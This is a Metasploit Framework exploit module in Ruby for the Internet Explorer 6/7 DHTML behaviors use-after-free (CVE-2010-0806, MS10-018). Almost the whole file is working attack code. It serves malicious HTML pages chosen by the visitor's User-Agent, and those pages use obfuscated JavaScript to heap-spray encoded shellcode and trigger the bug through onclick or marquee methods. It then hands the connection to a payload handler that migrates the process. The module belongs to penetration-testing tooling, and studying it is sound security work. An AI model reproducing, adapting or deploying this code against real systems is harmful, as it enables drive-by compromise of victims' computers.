##
# $Id: ms10_018_ie_behaviors.rb 11333 2010-12-14 18:53:22Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# originally ie_iepeers_pointer.rb
#
# Microsoft Internet Explorer iepeers.dll use-after-free exploit for the Metasploit Framework
#
# Tested successfully on the following platforms:
#  - Microsoft Internet Explorer 7, Windows Vista SP2
#  - Microsoft Internet Explorer 7, Windows XP SP3
#  - Microsoft Internet Explorer 6, Windows XP SP3
#
# Exploit found in-the-wild. For additional details:
# http://www.rec-sec.com/2010/03/10/internet-explorer-iepeers-use-after-free-exploit/
#
# Trancer
# http://www.rec-sec.com
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	#
	# Superceded by ms10_090_ie_css_clip, disable for BrowserAutopwn
	#
	#include Msf::Exploit::Remote::BrowserAutopwn
	#autopwn_info({
	#	:ua_name    => HttpClients::IE,
	#	:ua_minver  => "6.0",
	#	:ua_maxver  => "7.0",
	#	:javascript => true,
	#	:os_name    => OperatingSystems::WINDOWS,
	#	:vuln_test  => nil, # no way to test without just trying it
	#})

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Internet Explorer DHTML Behaviors Use After Free',
			'Description'    => %q{
					This module exploits a use-after-free vulnerability within the DHTML behaviors
				functionality of Microsoft Internet Explorer versions 6 and 7. This bug was
				discovered being used in-the-wild and was previously known as the "iepeers"
				vulnerability. The name comes from Microsoft's suggested workaround to block
				access to the iepeers.dll file.

				According to Nico Waisman, "The bug itself is when trying to persist an object
				using the setAttribute, which end up calling VariantChangeTypeEx with both the
				source and the destination being the same variant. So if you send as a variant
				an IDISPATCH the algorithm will try to do a VariantClear of the destination before
				using it. This will end up on a call to PlainRelease which deref the reference
				and clean the object."

				NOTE: Internet Explorer 8 and Internet Explorer 5 are not affected.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'unknown',                         # original discovery
					'Trancer <mtrancer[at]gmail.com>', # metasploit module
					'Nanika',                          # HIT2010 IE7 reliable PoC
					'jduck'                            # minor cleanups
				],
			'Version'        => '$Revision: 11333 $',
			'References'     =>
				[
					[ 'CVE', '2010-0806' ],
					[ 'OSVDB', '62810' ],
					[ 'BID', '38615' ],
					[ 'URL', 'http://www.microsoft.com/technet/security/advisory/981374.mspx' ],
					[ 'URL', 'http://www.avertlabs.com/research/blog/index.php/2010/03/09/targeted-internet-explorer-0day-attack-announced-cve-2010-0806/' ],
					[ 'URL', 'http://eticanicomana.blogspot.com/2010/03/aleatory-persitent-threat.html' ],
					[ 'MSB', 'MS10-018' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00\x09\x0a\x0d'\\",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ '(Automatic) IE6, IE7 on Windows NT, 2000, XP, 2003 and Vista',
						{
							'Method' => 'automatic'
						}
					],

					[ 'IE 6 SP0-SP2 (onclick)',
						{
							'Method' => 'onclick',
							'Ret' => 0x0C0C0C0C
						}
					],

					# "A great celebration of HIT2010" - http://www.hitcon.org/
					[ 'IE 7.0 (marquee)',
						{
							'Method' => 'marquee',
							'Ret' => 0x0C0C0C0C
						}
					],
				],
			'DisclosureDate' => 'Mar 09 2010',
			'DefaultTarget'  => 0))
	end


	def auto_target(cli, request)
		mytarget = nil

		agent = request.headers['User-Agent']
		#print_status("Checking user agent: #{agent}")
		if agent =~ /Windows NT 6\.0/
			mytarget = targets[2]   # IE7 on Vista
		elsif agent =~ /MSIE 7\.0/
			mytarget = targets[2]   # IE7 on XP and 2003
		elsif agent =~ /MSIE 6\.0/
			mytarget = targets[1]   # IE6 on NT, 2000, XP and 2003
		else
			print_error("Unknown User-Agent #{agent} from #{cli.peerhost}:#{cli.peerport}")
		end

		mytarget
	end


	def on_request_uri(cli, request)

		if target['Method'] == 'automatic'
			mytarget = auto_target(cli, request)
			if (not mytarget)
				send_not_found(cli)
				return
			end
		else
			mytarget = target
		end

		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport} (target: #{mytarget.name})...")

		# Encode the shellcode
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(mytarget.arch))

		# Set the return\nops
		ret  	    = Rex::Text.to_unescape([mytarget.ret].pack('V'))

		# Randomize the javascript variable names
		j_shellcode	 = rand_text_alpha(rand(100) + 1)
		j_nops		 = rand_text_alpha(rand(100) + 1)
		j_slackspace = rand_text_alpha(rand(100) + 1)
		j_fillblock	 = rand_text_alpha(rand(100) + 1)
		j_memory	    = rand_text_alpha(rand(100) + 1)
		j_counter	 = rand_text_alpha(rand(30) + 2)
		j_ret		    = rand_text_alpha(rand(100) + 1)
		j_array		 = rand_text_alpha(rand(100) + 1)
		j_function1	 = rand_text_alpha(rand(100) + 1)
		j_function2	 = rand_text_alpha(rand(100) + 1)
		j_object	    = rand_text_alpha(rand(100) + 1)
		j_id		    = rand_text_alpha(rand(100) + 1)

		# Construct the final page
		case mytarget['Method']

		when 'onclick'
			html = %Q|<html><body>
<button id='#{j_id}' onclick='#{j_function2}();' style='display:none'></button>
<script language='javascript'>
function #{j_function1}(){
var #{j_shellcode} = unescape('#{shellcode}');
#{j_memory} = new Array();
var #{j_slackspace} = 0x86000-(#{j_shellcode}.length*2);
var #{j_nops} = unescape('#{ret}');
while(#{j_nops}.length<#{j_slackspace}/2) { #{j_nops}+=#{j_nops}; }
var #{j_fillblock} = #{j_nops}.substring(0,#{j_slackspace}/2);
delete #{j_nops};
for(#{j_counter}=0; #{j_counter}<270; #{j_counter}++) {
#{j_memory}[#{j_counter}] = #{j_fillblock} + #{j_fillblock} + #{j_shellcode};
}
}
function #{j_function2}(){
#{j_function1}();
var #{j_object} = document.createElement('body');
#{j_object}.addBehavior('#default#userData');
document.appendChild(#{j_object});
try {
for (#{j_counter}=0; #{j_counter}<10; #{j_counter}++) {
#{j_object}.setAttribute('s',window);
}
} catch(e){ }
window.status+='';
}
document.getElementById('#{j_id}').onclick();
</script></body></html>
|

		when 'marquee'
			j_attrib = rand_text_alpha(6);
			html = %Q|<html>
<head>
<style type="text/css">
.#{j_object} {behavior: url(#default#userData);}
</style>
</head>
<script>
function #{j_function1}(){
var #{j_shellcode} = unescape('#{shellcode}');
#{j_memory} = new Array();
var #{j_slackspace} = 0x86000-(#{j_shellcode}.length*2);
var #{j_nops} = unescape('#{ret}');
while(#{j_nops}.length<#{j_slackspace}/2) { #{j_nops}+=#{j_nops}; }
var #{j_fillblock} = #{j_nops}.substring(0,#{j_slackspace}/2);
delete #{j_nops};
for(#{j_counter}=0; #{j_counter}<270; #{j_counter}++) {
#{j_memory}[#{j_counter}] = #{j_fillblock} + #{j_fillblock} + #{j_shellcode};
}
}
function #{j_function2}() {
#{j_function1}();
for (#{j_counter} = 1; #{j_counter} <10; #{j_counter} ++ ){
#{j_id}.setAttribute("#{j_attrib}",document.location);
}
#{j_id}.setAttribute("#{j_attrib}",document.getElementsByName("style"));
document.location="about:\\u0c0c\\u0c0c\\u0c0c\\u0c0cblank";
}
</script>
<body onload="#{j_function2}();"></body>
<MARQUEE id="#{j_id}" class="#{j_object}"></MARQUEE>
</html>
|

		end

		# Transmit the compressed response to the client
		send_response(cli, html, { 'Content-Type' => 'text/html' })

		# Handle the payload
		handler(cli)

	end

end

